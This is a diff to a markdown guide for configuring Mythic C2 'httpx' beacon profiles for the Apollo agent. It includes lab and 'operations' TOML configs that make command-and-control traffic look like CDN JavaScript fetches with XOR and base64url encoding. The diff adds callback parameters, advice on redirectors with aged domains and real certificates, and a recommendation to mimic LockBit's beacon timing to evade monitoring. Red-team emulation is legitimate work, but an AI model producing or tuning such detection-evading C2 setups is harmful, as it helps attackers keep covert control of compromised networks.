@@ -23,14 +23,13 @@
 
 ### Option 1: Lab Setup (Current)
 **Files:**
-- `httpx_config_fixed.toml` - Basic configuration
-- `httpx_minimal.json` - Minimal JSON config
+- `generic_cdn_beacon.lab.toml` - Basic configuration
 
 **Use Case:** Training, testing, CTF challenges  
 **Risk:** High detection if used against real security monitoring
 
 ### Option 2: OPSEC-Hardened (Recommended for ops)
-**File:** `httpx_config_hardened.toml`
+**File:** `generic_cdn_beacon.ops.toml`
 
 **Improvements:**
 1. ✓ Real browser User-Agent (Chrome 120.0)
@@ -43,7 +42,7 @@
 
 **Remaining Issues (must configure separately):**
 - Port 82 → must change to 443 or 80 in payload params
-- Domain → must use real domain or domain fronting
+- Domain → redirector FQDN on 443 (aged registered domain you own); NOT fronting/CDN (F6)
 - Callback endpoint → needs to be legitimate-looking service
 
 ## Deployment Comparison
@@ -51,8 +50,8 @@
 ### Basic Config (Lab Testing)
 
 ```toml
-# httpx_config_fixed.toml
-name = "fin8_cdn"
+# generic_cdn_beacon.lab.toml
+name = "generic_cdn_beacon"
 [get]
 uris = ["/js/lib.min.js"]
 [get.client]
@@ -79,22 +78,22 @@ Callback Jitter: 37%
 ### Hardened Config (Operations)
 
 ```toml
-# httpx_config_hardened.toml
-name = "fin8_cdn_hardened"
+# generic_cdn_beacon.ops.toml
+name = "generic_cdn_beacon"
 [get]
 uris = ["/cdn/jquery.min.js", "/assets/bootstrap.min.js", "/js/app.bundle.js"]
 [get.client]
 headers.User-Agent = "Mozilla/5.0... Chrome/120.0.0.0..."
 [[get.client.transforms]]
 action = "xor"
-value = "mythic"
+value = "SET_PER_OP_RANDOM"
 [[get.client.transforms]]
 action = "base64url"
 ```
 
 **Payload Parameters:**
 ```
-Callback Domain: https://jsdelivr.net (or domain-front via CDN)
+Callback Domain: https://<REDIR_FQDN>:443 (redirector, real LE cert)
 Callback Interval: 45-90s (randomized)
 Callback Jitter: 50%
 Domain Rotation: fail-over (to backup domains)
@@ -102,7 +101,7 @@ Domain Rotation: fail-over (to backup domains)
 
 **Improvements:**
 - Port 443 (HTTPS standard)
-- Real domain (JSDelivr CDN)
+- Redirector on 443 with a real LE cert (normalises TLS -> N6); NOT a real CDN (F6)
 - Multiple URIs (3 variations)
 - Realistic User-Agent
 - XOR + Base64url (harder to detect)
@@ -206,7 +205,7 @@ detects a beacon:
 ```
 Payload Type: apollo
 C2 Profile: httpx
-raw_c2_config: httpx_config_fixed.toml
+raw_c2_config: generic_cdn_beacon.lab.toml
 Callback Domain: http://10.23.20.10:82
 Callback Interval: 62
 Callback Jitter: 37
@@ -221,8 +220,8 @@ Encrypted Exchange Check: true
 ```
 Payload Type: apollo
 C2 Profile: httpx
-raw_c2_config: httpx_config_hardened.toml
-Callback Domain: https://jsdelivr.net:443
+raw_c2_config: generic_cdn_beacon.ops.toml
+Callback Domain: https://<REDIR_FQDN>:443
 Callback Interval: 60
 Callback Jitter: 50
 Domain Rotation: round-robin
@@ -319,20 +318,19 @@ Before operational deployment, verify:
 
 | File | Purpose | Use Case |
 |------|---------|----------|
-| `httpx_config_fixed.toml` | Basic working config | Lab/Testing |
-| `httpx_minimal.json` | Minimal JSON format | Testing/validation |
-| `httpx_config_hardened.toml` | Hardened for operations | Red Team ops |
+| `generic_cdn_beacon.lab.toml` | Basic working config | Lab/Testing |
+| `generic_cdn_beacon.ops.toml` | Hardened for operations | Red Team ops |
 
 ---
 
 ## Recommendations
 
-**For Lab/CTF:** Use `httpx_config_fixed.toml` - focus on functionality
+**For Lab/CTF:** Use `generic_cdn_beacon.lab.toml` - focus on functionality
 
-**For Red Team:** Use `httpx_config_hardened.toml` + adjust:
+**For Red Team:** Use `generic_cdn_beacon.ops.toml` + adjust:
 1. Change port 82 → 443
-2. Use real domain (jsDelivr, unpkg) or domain front
-3. Increase jitter to 50%+
+2. Use your redirector FQDN on 443 (aged registered domain); NOT a real CDN / fronting (F6)
+3. Use the actor's documented cadence (LockBit 62s/37%), not a generic 50%+ (F7)
 4. Add domain rotation
 
 **For Evasion:** Add redirector layer:
